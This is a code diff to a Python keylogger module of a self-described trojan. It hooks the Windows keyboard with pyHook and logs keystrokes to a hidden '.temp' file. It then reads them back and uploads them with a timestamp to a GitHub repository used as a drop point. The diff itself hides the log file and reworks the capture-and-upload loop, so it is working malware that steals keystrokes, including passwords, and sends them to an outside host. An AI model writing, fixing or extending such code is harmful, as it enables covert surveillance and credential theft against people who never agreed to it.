@@ -5,6 +5,7 @@ import pyHook
 import win32clipboard
 import time
 from github3 import login
+import datetime
 
 user32   = windll.user32
 kernel32 = windll.kernel32
@@ -13,7 +14,7 @@ current_window = None
 
 num = 1
 s = ""
-f = open("file.txt", "a");
+f = open(".temp", "a");
 trojan_id = "abc"
 trojan_config = "%s.json" % trojan_id
 data_path     = "data/%s/" % trojan_id
@@ -84,17 +85,19 @@ def run(**args):
     global f
     kl         = pyHook.HookManager()
     kl.KeyDown = KeyStroke
-    kl.HookKeyboard()
     while True:
-		while num < 100:
-			time.sleep(0.02)
-			pythoncom.PumpWaitingMessages()
-			f.close()
-			f = open("file.txt", "r")
-			f.close()
-			store_module_result(f.read())
-			f = open("file.txt", "a")
-		num = 1
+        kl.HookKeyboard()
+        while num < 100:
+            time.sleep(0.02)
+            pythoncom.PumpWaitingMessages()
+        print "her"
+        f.close()
+        f = open(".temp", "r")
+        store_module_result(f.read())
+        f.close()
+        f = open(".temp", "a")
+        num = 1
+        kl.UnhookKeyboard()
 def store_module_result(data):
     gh,repo,branch = connect_to_github()
     remote_path = "data/%s/%s.data" % (trojan_id,str(datetime.datetime.now()))                            
